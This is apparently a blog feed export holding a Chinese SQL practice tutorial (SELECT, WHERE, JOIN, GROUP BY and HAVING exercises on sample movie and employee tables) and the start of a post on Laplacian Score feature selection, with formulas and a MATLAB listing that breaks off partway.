        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>SQL是目前数据分析必备的技能，Hadoop生态中的Hive与SQL语法也几乎一样，所以入门数据分析，SQL是必须掌握的。因为如果连取数都不熟练甚至取数不准确，怎么做数据分析呢？</p><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><h3 id="Lesson0（体验）"><a href="#Lesson0（体验）" class="headerlink" title="Lesson0（体验）"></a>Lesson0（体验）</h3><p>SQL不多介绍了，练习内容来自<a href="http://xuesql.cn/" target="_blank" rel="noopener">自学SQL网</a>（侵删），题目答案均为自己写。</p><p>表格如下（表名 Movies ）：</p><div class="table-container"><table><thead><tr><th>Id</th><th>Title</th><th>Director</th><th>Year</th><th>Length_minutes</th></tr></thead><tbody><tr><td>1</td><td>Toy Story</td><td>John Lasseter</td><td>1995</td><td>81</td></tr><tr><td>2</td><td>A Bug’s Life</td><td>John Lasseter</td><td>1998</td><td>95</td></tr><tr><td>3</td><td>Toy Story 2</td><td>John Lasseter</td><td>1999</td><td>93</td></tr><tr><td>4</td><td>Monsters, Inc.</td><td>Pete Docter</td><td>2001</td><td>92</td></tr><tr><td>5</td><td>Finding Nemo</td><td>Finding Nemo</td><td>2003</td><td>107</td></tr><tr><td>6</td><td>The Incredibles</td><td>Brad Bird</td><td>2004</td><td>116</td></tr><tr><td>7</td><td>Cars</td><td>John Lasseter</td><td>2006</td><td>117</td></tr><tr><td>8</td><td>Ratatouille</td><td>Brad Bird</td><td>2007</td><td>115</td></tr><tr><td>9</td><td>WALL-E</td><td>Andrew Stanton</td><td>2008</td><td>104</td></tr><tr><td>10</td><td>Up</td><td>Pete Docter</td><td>2009</td><td>101</td></tr><tr><td>11</td><td>Toy Story 3</td><td>Lee Unkrich</td><td>2010</td><td>103</td></tr><tr><td>12</td><td>Cars 2</td><td>John Lasseter</td><td>2011</td><td>120</td></tr><tr><td>13</td><td>Brave</td><td>Brenda Chapman</td><td>2012</td><td>102</td></tr><tr><td>14</td><td>Monsters University</td><td>Dan Scanlon</td><td>2013</td><td>110</td></tr></tbody></table></div><p>练习 do it — 请完成如下任务</p><ol><li>【初体验】这是第一题,请你先将左侧的输入框里的内容清空，然后请输入下面的SQL，您将看到所有电影标题：<br><code>SELECT title FROM movies</code> </li><li>【初体验】请输入如下SQL你将看到4条电影（切记先清空数据框且出错要耐心比对）：<br><code>SELECT title,director FROM movies WHERE Id &lt; 5</code></li><li>【初体验】输入如下SQL你将看到电影总条数：<br><code>SELECT count(*) FROM movies</code></li><li>【初体验】SQL可以直接做计算，下面的SQL计算1+1的和,请输入：<br>SELECT 1+1</li></ol><p>1.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select title from movies</code></pre><p>2.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select title,director from movies where id <5</code></pre><p>3.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select count(*) from movies</code></pre><p>4.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select 1+1</code></pre><h3 id="Lesson1（查询）"><a href="#Lesson1（查询）" class="headerlink" title="Lesson1（查询）"></a>Lesson1（查询）</h3><p>表格与<strong>Lesson0</strong>相同</p><p>练习 do it — 请完成如下任务</p><ol><li>【简单查询】找到所有电影的名称<code>title</code></li><li>【简单查询】找到所有电影的导演</li><li>【简单查询】找到所有电影的名称和导演</li><li>【简单查询】找到所有电影的名称和上映年份</li><li>【简单查询】找到所有电影的所有信息</li><li>【简单查询】找到所有电影的名称,Id和播放时长</li></ol><p>1.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select title from movies</code></pre><p>2、</p><pre class=" language-lang-sql"><code class="language-lang-sql">select director from movies</code></pre><p>3.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select title,director from movies</code></pre><p>4.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select title,year from movies</code></pre><p>5.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select * from movies</code></pre><p>6.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select title,id,length_minutes from movies</code></pre><h3 id="Lesson2-条件查询-constraints-Pt-1"><a href="#Lesson2-条件查询-constraints-Pt-1" class="headerlink" title="Lesson2 :条件查询 (constraints) (Pt. 1)"></a>Lesson2 :<strong>条件查询 (constraints) (Pt. 1)</strong></h3><p>表格与<strong>Lesson0</strong>相同</p><p>练习 do it — 请完成如下任务</p><ol><li>【简单条件】找到<code>id</code>为6的电影 ✓</li><li>【简单条件】找到在2000-2010年间<code>year</code>上映的电影</li><li>【简单条件】找到不是在2000-2010年间<code>year</code>上映的电影</li><li>【简单条件】找到头5部电影</li><li>【简单条件】找到2010（含）年之后的电影里片长小于两个小时的片子</li></ol><p>1.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select * from movies where id=6</code></pre><p>2.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select * from movies where year between 2000 and 2010</code></pre><p>3.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select * from movies where year not between 2000 and 2010</code></pre><p>4.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select * from movies where id <=5</code></pre><p>5.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select * from movies where year >=2010 and length_minutes <120</code></pre><h3 id="Lesson-3-条件查询-constraints-Pt-2"><a href="#Lesson-3-条件查询-constraints-Pt-2" class="headerlink" title="Lesson 3: 条件查询(constraints) (Pt. 2)"></a><strong>Lesson 3: 条件查询(constraints) (Pt. 2)</strong></h3><p>表格与<strong>Lesson0</strong>相同</p><p>练习 do it — 请完成如下任务</p><ol><li>【复杂条件】找到所有<code>Toy Story</code>系列电影</li><li>【复杂条件】找到所有<code>John Lasseter</code>导演的电影</li><li>【复杂条件】找到所有不是<code>John Lasseter</code>导演的电影</li><li>【复杂条件】找到所有电影名为<code>&quot;WALL-&quot;</code>开头的电影</li><li><p>【复杂条件】有一部98年电影中文名《虫虫危机》请给我找出来</p><p>1.</p></li></ol><pre class=" language-lang-sql"><code class="language-lang-sql">SELECT * FROM movies where title = 'Toy Story' or title like 'Toy Story %'</code></pre><p>字符串用<kbd>‘ ‘</kbd>表示，字符串区分大小写</p><p>like(模糊查询)， %（通配符） </p><p>当使用通配符时，需要用like；当没有用通配符时，like没有用通配符等价于=，not like等价于!=</p><p>2.</p><pre class=" language-lang-sql"><code class="language-lang-sql">SELECT * FROM movies where Director = 'John Lasseter'</code></pre><p>3.</p><pre class=" language-lang-sql"><code class="language-lang-sql">SELECT * FROM movies where Director != 'John Lasseter'</code></pre><p>4.</p><pre class=" language-lang-sql"><code class="language-lang-sql">SELECT * FROM movies where title like 'WALL-%'</code></pre><p>5.</p><pre class=" language-lang-sql"><code class="language-lang-sql">SELECT * FROM movies where year = 1998</code></pre><h3 id="Lesson-4-查询结果Filtering过滤-和-sorting排序"><a href="#Lesson-4-查询结果Filtering过滤-和-sorting排序" class="headerlink" title="Lesson 4: 查询结果Filtering过滤 和 sorting排序"></a><strong>Lesson 4: 查询结果Filtering过滤 和 sorting排序</strong></h3><p>表格与<strong>Lesson0</strong>相同</p><p>练习 do it — 请完成如下任务</p><ol><li>【结果排序】按导演名<code>排重</code>列出所有电影(只显示导演)，并按导演名正序排列</li><li>【结果排序】列出按上映年份<code>最新</code>上线的4部电影</li><li>【结果排序】按电影名字母序<code>升序</code>排列，列出前5部电影</li><li>【结果排序】按电影名字母序升序排列，列出上一题<code>之后</code>的5部电影</li><li>【结果排序】如果按片长排列，John Lasseter导演导过片长第3长的电影是哪部，列出名字即可</li></ol><p>1.</p><p> <strong>DISTINCT</strong> 去重</p><pre class=" language-lang-sql"><code class="language-lang-sql">select distinct director from movies order by director asc</code></pre><p>2.</p><p> 通过 <code>OFFSET</code> 指定从哪里开始剪，用 <code>LIMIT</code> 指定剪下多少长度 </p><pre class=" language-lang-sql"><code class="language-lang-sql">select * from movies order by year desc limit 4 offset 0select * from movies order by year desc limit 4</code></pre><p>3.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select * from movies order by title limit 5</code></pre><p>4.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select * from movies order by title limit 5 offset 5</code></pre><p>5.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select title from movies where director = 'John Lasseter'order by length_minutes desc limit 1 offset 2</code></pre><h3 id="Lesson-5（Review）-复习-SELECT-查询"><a href="#Lesson-5（Review）-复习-SELECT-查询" class="headerlink" title="Lesson 5（Review） 复习 SELECT 查询"></a><strong>Lesson 5（Review） 复习 SELECT 查询</strong></h3><p>Table(表）: North_american_cities</p><div class="table-container"><table><thead><tr><th>City</th><th>Country</th><th>Population</th><th>Latitude</th><th>Longitude</th></tr></thead><tbody><tr><td>Guadalajara</td><td>Mexico</td><td>1500800</td><td>20.659699</td><td>-103.349609</td></tr><tr><td>Toronto</td><td>Canada</td><td>2795060</td><td>43.653226</td><td>-79.383184</td></tr><tr><td>Houston</td><td>United States</td><td>2195914</td><td>29.760427</td><td>-95.369803</td></tr><tr><td>New York</td><td>United States</td><td>8405837</td><td>40.712784</td><td>-74.005941</td></tr><tr><td>Philadelphia</td><td>United States</td><td>1553165</td><td>39.952584</td><td>-75.165222</td></tr><tr><td>Havana</td><td>Cuba</td><td>2106146</td><td>23.05407</td><td>-82.345189</td></tr><tr><td>Mexico City</td><td>Mexico</td><td>8555500</td><td>19.432608</td><td>-99.133208</td></tr><tr><td>Phoenix</td><td>United States</td><td>1513367</td><td>33.448377</td><td>-112.074037</td></tr><tr><td>Los Angeles</td><td>United States</td><td>3884307</td><td>34.052234</td><td>-118.243685</td></tr><tr><td>Ecatepec de Morelos</td><td>Mexico</td><td>1742000</td><td>19.601841</td><td>-99.050674</td></tr><tr><td>Montreal</td><td>Canada</td><td>1717767</td><td>45.501689</td><td>-73.567256</td></tr><tr><td>Chicago</td><td>United States</td><td>2718782</td><td>41.878114</td><td>-87.629798</td></tr></tbody></table></div><p>练习 do it — 请完成如下任务</p><ol><li>【复习】列出所有加拿大人的<code>Canadian</code>信息(包括所有字段)</li><li>【复习】列出所有在<code>Chicago</code>西部的城市，从西到东排序(包括所有字段)</li><li>【复习】用人口数<code>population</code>排序,列出墨西哥<code>Mexico</code>最大的2个城市(包括所有字段)</li><li>【复习】列出美国<code>United States</code>人口3-4位的两个城市和他们的人口(包括所有字段)</li></ol><p>1.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select * from North_american_cities where country='Canada'</code></pre><p>2.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select * from North_american_cities where longitude < -87.629798 order by longitude</code></pre><p>（此处需改进）</p><p>3.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select * from North_american_cities where country = 'Mexico' order by population desc limit 2</code></pre><p>4.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select * from North_american_cities where country = 'United States' order by population desc  limit 2 offset 2</code></pre><h3 id="Lesson-6-用JOINs进行多表联合查询"><a href="#Lesson-6-用JOINs进行多表联合查询" class="headerlink" title="Lesson 6: 用JOINs进行多表联合查询"></a><strong>Lesson 6: 用JOINs进行多表联合查询</strong></h3><p>在<strong>Lesson0</strong>的Movies表基础上增加另外一个表：</p><p>Table: Boxoffice (Read-Only)</p><div class="table-container"><table><thead><tr><th>Movie_id</th><th>Rating</th><th>Domestic_sales</th><th>International_sales</th></tr></thead><tbody><tr><td>5</td><td>8.2</td><td>380843261</td><td>555900000</td></tr><tr><td>14</td><td>7.4</td><td>268492764</td><td>475066843</td></tr><tr><td>8</td><td>8</td><td>206445654</td><td>417277164</td></tr><tr><td>12</td><td>6.4</td><td>191452396</td><td>368400000</td></tr><tr><td>3</td><td>7.9</td><td>245852179</td><td>239163000</td></tr><tr><td>6</td><td>8</td><td>261441092</td><td>370001000</td></tr><tr><td>9</td><td>8.5</td><td>223808164</td><td>297503696</td></tr><tr><td>11</td><td>8.4</td><td>415004880</td><td>648167031</td></tr><tr><td>1</td><td>8.3</td><td>191796233</td><td>170162503</td></tr><tr><td>7</td><td>7.2</td><td>244082982</td><td>217900167</td></tr><tr><td>10</td><td>8.3</td><td>293004164</td><td>438338580</td></tr><tr><td>4</td><td>8.1</td><td>289916256</td><td>272900000</td></tr><tr><td>2</td><td>7.2</td><td>162798565</td><td>200600000</td></tr><tr><td>13</td><td>7.2</td><td>237283207</td><td>301700000</td></tr></tbody></table></div><p>练习 do it — 请完成如下任务</p><ol><li>【联表】找到所有电影的国内<code>Domestic_sales</code>和国际销售额</li><li>【联表】找到所有国际销售额比国内销售大的电影</li><li>【联表】找出所有电影按市场占有率<code>rating</code>倒序排列</li><li>【联表】每部电影按国际销售额比较,排名最靠前的导演是谁,国际销量多少</li></ol><p>1.</p><p> <code>INNER JOIN</code> 可以简写做 <code>JOIN</code> </p><p>（<kbd>INNER</kbd>必须大写）</p><pre class=" language-lang-sql"><code class="language-lang-sql">select * from movies INNER join boxoffice on movies.id = boxoffice.movie_id</code></pre><p>2.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select * from movies INNER join boxoffice on movies.id = boxoffice.movie_idwhere     domestic_sales<international_sales</code></pre><p>3.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select * from movies INNER join boxoffice on movies.id = boxoffice.movie_idorder by rating</code></pre><p>4.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select director,international_sales from movies INNER join boxoffice on movies.id = boxoffice.movie_idorder by international_sales desclimit 1</code></pre><h3 id="Lesson-7-外连接（OUTER-JOINs）"><a href="#Lesson-7-外连接（OUTER-JOINs）" class="headerlink" title="Lesson 7: 外连接（OUTER JOINs）"></a><strong>Lesson 7: 外连接（OUTER JOINs）</strong></h3><p>Table: Employees</p><div class="table-container"><table><thead><tr><th>Role</th><th>Name</th><th>Building</th><th>Years_employed</th></tr></thead><tbody><tr><td>Engineer</td><td>Becky A.</td><td>1e</td><td>4</td></tr><tr><td>Engineer</td><td>Dan B.</td><td>1e</td><td>2</td></tr><tr><td>Engineer</td><td>Sharon F.</td><td>1e</td><td>6</td></tr><tr><td>Engineer</td><td>Dan M.</td><td>1e</td><td>4</td></tr><tr><td>Engineer</td><td>Malcom S.</td><td>1e</td><td>1</td></tr><tr><td>Artist</td><td>Tylar S.</td><td>2w</td><td>2</td></tr><tr><td>Artist</td><td>Sherman D.</td><td>2w</td><td>8</td></tr><tr><td>Artist</td><td>Jakob J.</td><td>2w</td><td>6</td></tr><tr><td>Artist</td><td>Lillia A.</td><td>2w</td><td>7</td></tr><tr><td>Artist</td><td>Brandon J.</td><td>2w</td><td>7</td></tr><tr><td>Manager</td><td>Scott K.</td><td>1e</td><td>9</td></tr><tr><td>Manager</td><td>Shirlee M.</td><td>1e</td><td>3</td></tr><tr><td>Manager</td><td>Daria O.</td><td>2w</td><td>6</td></tr><tr><td>Engineer</td><td>Yancy I.</td><td>null</td><td>0</td></tr><tr><td>Artist</td><td>Oliver P.</td><td>null</td><td>0</td></tr></tbody></table></div><p>Table: Buildings</p><div class="table-container"><table><thead><tr><th>Building_name</th><th>Capacity</th></tr></thead><tbody><tr><td>1e</td><td>24</td></tr><tr><td>1w</td><td>32</td></tr><tr><td>2e</td><td>16</td></tr><tr><td>2w</td><td>20</td></tr></tbody></table></div><p>练习 do it — 请完成如下任务</p><ol><li>【复习】找到所有有雇员的办公室(<code>buildings</code>)名字</li><li>【复习】找到所有办公室里的所有角色（包含没有雇员的）,并做唯一输出(<code>DISTINCT</code>)</li><li>【难题】找到所有有雇员的办公室(<code>buildings</code>)和对应的容量</li></ol><p>1.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select distinct building from employees where building is not null</code></pre><p>2.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select distinct Building_name, Role from BuildingsLEFT JOIN Employees  on  Buildings.Building_name = Employees.Building</code></pre><p>3.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select distinct Building_name,Capacity from Employeesleft join Buildings on  Buildings.Building_name = Employees.Buildingwhere Building_name not is null</code></pre><h3 id="Lesson-8-关于特殊关键字-NULLs"><a href="#Lesson-8-关于特殊关键字-NULLs" class="headerlink" title="Lesson 8: 关于特殊关键字 NULLs"></a><strong>Lesson 8: 关于特殊关键字 NULLs</strong></h3><p>表格与<strong>Lesson7</strong>相同</p><p>练习 do it — 请完成如下任务</p><ol><li>【复习】找到雇员里还没有分配办公室的(列出名字和角色就可以)</li><li>【难题】找到还没有雇员的办公室</li></ol><p>1.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select Role,Name from Employeeswhere     Building is null</code></pre><p>2.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select Building_name from Buildingswhere Building_name not in(select    Building from Employees where building is not null)</code></pre><h3 id="Lesson-9-在查询中使用表达式"><a href="#Lesson-9-在查询中使用表达式" class="headerlink" title="Lesson 9: 在查询中使用表达式"></a><strong>Lesson 9: 在查询中使用表达式</strong></h3><p>Table: Movies (Read-Only)</p><div class="table-container"><table><thead><tr><th>Id</th><th>Title</th><th>Director</th><th>Year</th><th>Length_minutes</th></tr></thead><tbody><tr><td>1</td><td>Toy Story</td><td>John Lasseter</td><td>1995</td><td>81</td></tr><tr><td>2</td><td>A Bug’s Life</td><td>John Lasseter</td><td>1998</td><td>95</td></tr><tr><td>3</td><td>Toy Story 2</td><td>John Lasseter</td><td>1999</td><td>93</td></tr><tr><td>4</td><td>Monsters, Inc.</td><td>Pete Docter</td><td>2001</td><td>92</td></tr><tr><td>5</td><td>Finding Nemo</td><td>Finding Nemo</td><td>2003</td><td>107</td></tr><tr><td>6</td><td>The Incredibles</td><td>Brad Bird</td><td>2004</td><td>116</td></tr><tr><td>7</td><td>Cars</td><td>John Lasseter</td><td>2006</td><td>117</td></tr><tr><td>8</td><td>Ratatouille</td><td>Brad Bird</td><td>2007</td><td>115</td></tr><tr><td>9</td><td>WALL-E</td><td>Andrew Stanton</td><td>2008</td><td>104</td></tr><tr><td>10</td><td>Up</td><td>Pete Docter</td><td>2009</td><td>101</td></tr><tr><td>11</td><td>Toy Story 3</td><td>Lee Unkrich</td><td>2010</td><td>103</td></tr><tr><td>12</td><td>Cars 2</td><td>John Lasseter</td><td>2011</td><td>120</td></tr><tr><td>13</td><td>Brave</td><td>Brenda Chapman</td><td>2012</td><td>102</td></tr><tr><td>14</td><td>Monsters University</td><td>Dan Scanlon</td><td>2013</td><td>110</td></tr></tbody></table></div><p>Table: Boxoffice (Read-Only)</p><div class="table-container"><table><thead><tr><th>Movie_id</th><th>Rating</th><th>Domestic_sales</th><th>International_sales</th></tr></thead><tbody><tr><td>5</td><td>8.2</td><td>380843261</td><td>555900000</td></tr><tr><td>14</td><td>7.4</td><td>268492764</td><td>475066843</td></tr><tr><td>8</td><td>8</td><td>206445654</td><td>417277164</td></tr><tr><td>12</td><td>6.4</td><td>191452396</td><td>368400000</td></tr><tr><td>3</td><td>7.9</td><td>245852179</td><td>239163000</td></tr><tr><td>6</td><td>8</td><td>261441092</td><td>370001000</td></tr><tr><td>9</td><td>8.5</td><td>223808164</td><td>297503696</td></tr><tr><td>11</td><td>8.4</td><td>415004880</td><td>648167031</td></tr><tr><td>1</td><td>8.3</td><td>191796233</td><td>170162503</td></tr><tr><td>7</td><td>7.2</td><td>244082982</td><td>217900167</td></tr><tr><td>10</td><td>8.3</td><td>293004164</td><td>438338580</td></tr><tr><td>4</td><td>8.1</td><td>289916256</td><td>272900000</td></tr><tr><td>2</td><td>7.2</td><td>162798565</td><td>200600000</td></tr><tr><td>13</td><td>7.2</td><td>237283207</td><td>301700000</td></tr></tbody></table></div><p>练习 do it — 请完成如下任务</p><ol><li>【计算】列出所有的电影ID,名字和销售总额(以百万美元为单位计算) ✓</li><li>【计算】列出所有的电影ID,名字和市场指数(<code>Rating</code>的10倍为市场指数)</li><li>【计算】列出所有偶数年份的电影，需要电影ID,名字和年份</li><li>【难题】John Lasseter导演的每部电影每分钟值多少钱,告诉我最高的3个电影名和价值就可以</li></ol><p>1.</p><p>as 命名别名</p><pre class=" language-lang-sql"><code class="language-lang-sql">select Id,Title,(International_sales+Domestic_sales)/1000000 from Moviesleft join Boxoffice on Movies.Id = Boxoffice.Movie_idselect Id,Title,(International_sales+Domestic_sales)/1000000 as sales from Moviesleft join Boxoffice on Movies.Id = Boxoffice.Movie_id</code></pre><p>2.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select Id,Title,10*Rating from Moviesleft join Boxoffice on Movies.Id = Boxoffice.Movie_id</code></pre><p>3.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select Id,Title,Year from Moviesleft join Boxoffice on Movies.Id = Boxoffice.Movie_idwhere Movies.Year%2 == 0</code></pre><p>4.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select Title,(International_sales+Domestic_sales)/Length_minutes from Moviesleft join Boxoffice on Movies.Id = Boxoffice.Movie_idwhere Director = 'John Lasseter'order by (International_sales+Domestic_sales)/Length_minutes desclimit 3</code></pre><h3 id="Lesson-10-在查询中进行统计I-Pt-1"><a href="#Lesson-10-在查询中进行统计I-Pt-1" class="headerlink" title="Lesson 10: 在查询中进行统计I (Pt. 1)"></a><strong>Lesson 10: 在查询中进行统计I (Pt. 1)</strong></h3><p>表格为<strong>Lesson7</strong>的Employees</p><p>练习 do it — 请完成如下任务</p><ol><li>【统计】找出就职年份最高的雇员(列出雇员名字+年份） ✓</li><li>【分组】按角色(<code>Role</code>)统计一下每个角色的平均就职年份</li><li>【分组】按办公室名字总计一下就职年份总和</li><li>【难题】每栋办公室按人数排名,不要统计无办公室的雇员</li></ol><p>1.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select Name,Years_employed from Employeesorder by Years_employed desc limit 1</code></pre><p>2.</p><p> <code>GROUP BY ...</code>，全部数据里有几条，就返回几条数据， 不管是否应用了统计函数. </p><pre class=" language-lang-sql"><code class="language-lang-sql">select role,avg(Years_employed) from Employeesgroup by role</code></pre><p>3.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select Building,sum(Years_employed) from Employeesgroup by Building</code></pre><p>4.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select Building,count(Name) from Employeeswhere Building is not nullgroup by Building</code></pre><h3 id="Lesson-11-在查询中进行统计II-Pt-2"><a href="#Lesson-11-在查询中进行统计II-Pt-2" class="headerlink" title="Lesson 11: 在查询中进行统计II (Pt. 2)"></a><strong>Lesson 11: 在查询中进行统计II (Pt. 2)</strong></h3><p> 在 <code>GROUP BY</code> 分组语法中，我们知道数据库是先对数据做<code>WHERE</code>，然后对结果做分组，如果我们要对分组完的数据再筛选出几条的操作：</p><p>  <code>HAVING</code>  可以对分组之后的数据再做SELECT筛选 。</p><p>1.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select count(Role) from Employeeswhere Role = 'Artist'</code></pre><p>2.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select Role,count(Role) from Employeesgroup by Role</code></pre><p>3.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select sum(Years_employed) from Employeeswhere Role = 'Engineer'</code></pre><p>4.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select count(),role,'1' from Employees where Building is not null group by roleunionselect count(),role,'0' from Employees where Building is null group by role</code></pre><h3 id="Lesson-12-查询执行顺序"><a href="#Lesson-12-查询执行顺序" class="headerlink" title="Lesson 12: 查询执行顺序"></a><strong>Lesson 12: 查询执行顺序</strong></h3><p>表格与<strong>Lesson 6</strong>相同</p><p>1.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select Director,count() from Moviesgroup by Director</code></pre><p>2.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select Director,sum(Domestic_sales+International_sales) as sales from Moviesleft join Boxoffice on movies.id = boxoffice.Movie_idgroup by Director</code></pre><p>3.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select sum(Domestic_sales+International_sales) as sales,Director,count(Title),sum(Domestic_sales+International_sales)/count(Title) from Moviesleft join Boxoffice on movies.id = boxoffice.Movie_idgroup by Directorhaving count(Title) != 1order by sum(Domestic_sales+International_sales)/count(Title) desclimit 1</code></pre><p>4.</p><pre class=" language-lang-sql"><code class="language-lang-sql">select (select max(Domestic_sales+International_sales) from Moviesleft join Boxoffice on movies.id = boxoffice.Movie_id)-(Domestic_sales+International_sales),Title from Moviesleft join Boxoffice on movies.id = boxoffice.Movie_id</code></pre><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="http://xuesql.cn/" target="_blank" rel="noopener">http://xuesql.cn/</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>特征选择 LaplacianScore</title>
      <link href="2020/11/03/te-zheng-xuan-ze-laplacian-score/"/>
      <url>2020/11/03/te-zheng-xuan-ze-laplacian-score/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>上次介绍了<a href="">一种特征选择方法：FisherScore</a>，但是没有介绍特征选择，更没有介绍特征工程。这里上一张别人的图简单介绍一下整个框架（找找特征选择在哪）。</p><p> <img src="https://img-blog.csdn.net/20180920175451704?" alt="img"> </p><h2 id="Laplacian-Score"><a href="#Laplacian-Score" class="headerlink" title="Laplacian Score"></a>Laplacian Score</h2><p>数据集$X={x_{ij} }$,$i=1,2…n;j=1,2…d.$其中$n$为样本数，$d$为样本特征数。标签信息$y_k,k={1,2…c}$,其中$c$为类簇数，$d_k^{ii’}$表示样本$i$与样本$i’$之间最近邻$k$个样本的最大距离。</p><p>构建无向权重图$G(V,E)$，其节点由图集$V=x_i$构成，样本间的近邻关系表示为图的边形成边集$E$。如果$||x_i-x_i^{‘}||\le d_k^{ii’}$，则样本$i$与样本$i’$连接成边。可定义下生成相似度矩阵 ：</p><script type="math/tex; mode=display">S_{ii'} = \left\{               \begin{array}{**lr**}              \dfrac{1}{n_k} , & y_i=y_{i'}=k \\               0,& 其他\\               \end{array}  \right.</script><p>定义$L<em>0$为无向权重图$G$中的拉普拉斯矩阵，令邻接矩阵$W</em>{ii’}=S_{ii’}(1\le i,i’ \le n)$，$W$是对称矩阵，其度矩阵$D$为：</p><script type="math/tex; mode=display">D_{ii'} = \left\{               \begin{array}{**lr**}              \sum_{i'=1}^n W_{ii'} , & i'= i \\               0,& i' \not=i \\               \end{array}  \right.</script><p>​        度矩阵反映企业样本周围聚集其他样本的密度，值越大则说明密度越大，由度矩阵与邻接矩阵可得到拉普拉斯矩阵$L$、        正则化的拉普拉斯矩阵$\delta$，计算拉普拉斯评分。  </p><script type="math/tex; mode=display">\left\{               \begin{array}{**lr**}              L = D-S  \\              \delta = D^{-\frac{1}{2}} L D^{-\frac{1}{2}} \\               \end{array}  \right.</script><p>其中$s_j$表示第$j$个特征$x_j$的期望值，定义如下：</p><script type="math/tex; mode=display">s_j = \sum(x_{ij} \dfrac{D_{ii}}{\sum_i D_{ii}} ) = \dfrac{ \sum_i x_{ij} D_{ii}}{\sum_i D_{ii}}</script><p>$s_j$即为各个特征的评分，评分越高，表示该特征对标签影响程度越大。</p><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><h3 id="constructW-m"><a href="#constructW-m" class="headerlink" title="constructW.m"></a>constructW.m</h3><pre class=" language-lang-matlab"><code class="language-lang-matlab">function W = constructW(fea,options)%    Usage:%    W = constructW(fea,options)%%    fea: Rows of vectors of data points. Each row is x_i%   options: Struct value in Matlab. The fields in options that can be set:%                  %           NeighborMode -  Indicates how to construct the graph. Choices%                           are: [Default 'KNN']%                'KNN'            -  k = 0%                                       Complete graph%                                    k > 0%                                      Put an edge between two nodes if and%                                      only if they are among the k nearst%                                      neighbors of each other. You are%                                      required to provide the parameter k in%                                      the options. Default k=5.%               'Supervised'      -  k = 0%                                       Put an edge between two nodes if and%                                       only if they belong to same class. %                                    k > 0%                                       Put an edge between two nodes if%                                       they belong to same class and they%                                       are among the k nearst neighbors of%                                       each other. %                                    Default: k=0%                                   You are required to provide the label%                                   information gnd in the options.%                                              %           WeightMode   -  Indicates how to assign weights for each edge%                           in the graph. Choices are:%               'Binary'       - 0-1 weighting. Every edge receiveds weight%                                of 1. %               'HeatKernel'   - If nodes i and j are connected, put weight%                                W_ij = exp(-norm(x_i - x_j)/2t^2). You are %                                required to provide the parameter t. [Default One]%               'Cosine'       - If nodes i and j are connected, put weight%                                cosine(x_i,x_j). %               %            k         -   The parameter needed under 'KNN' NeighborMode.%                          Default will be 5.%            gnd       -   The parameter needed under 'Supervised'%                          NeighborMode.  Colunm vector of the label%                          information for each data point.%            bLDA      -   0 or 1. Only effective under 'Supervised'%                          NeighborMode. If 1, the graph will be constructed%                          to make LPP exactly same as LDA. Default will be%                          0. %            t         -   The parameter needed under 'HeatKernel'%                          WeightMode. Default will be 1%         bNormalized  -   0 or 1. Only effective under 'Cosine' WeightMode.%                          Indicates whether the fea are already be%                          normalized to 1. Default will be 0%      bSelfConnected  -   0 or 1. Indicates whether W(i,i) == 1. Default 0%                          if 'Supervised' NeighborMode & bLDA == 1,%                          bSelfConnected will always be 1. Default 0.%            bTrueKNN  -   0 or 1. If 1, will construct a truly kNN graph%                          (Not symmetric!). Default will be 0. Only valid%                          for 'KNN' NeighborMode%%%    Examples:%%       fea = rand(50,15);%       options = [];%       options.NeighborMode = 'KNN';%       options.k = 5;%       options.WeightMode = 'HeatKernel';%       options.t = 1;%       W = constructW(fea,options);%       %       %       fea = rand(50,15);%       gnd = [ones(10,1);ones(15,1)*2;ones(10,1)*3;ones(15,1)*4];%       options = [];%       options.NeighborMode = 'Supervised';%       options.gnd = gnd;%       options.WeightMode = 'HeatKernel';%       options.t = 1;%       W = constructW(fea,options);%       %       %       fea = rand(50,15);%       gnd = 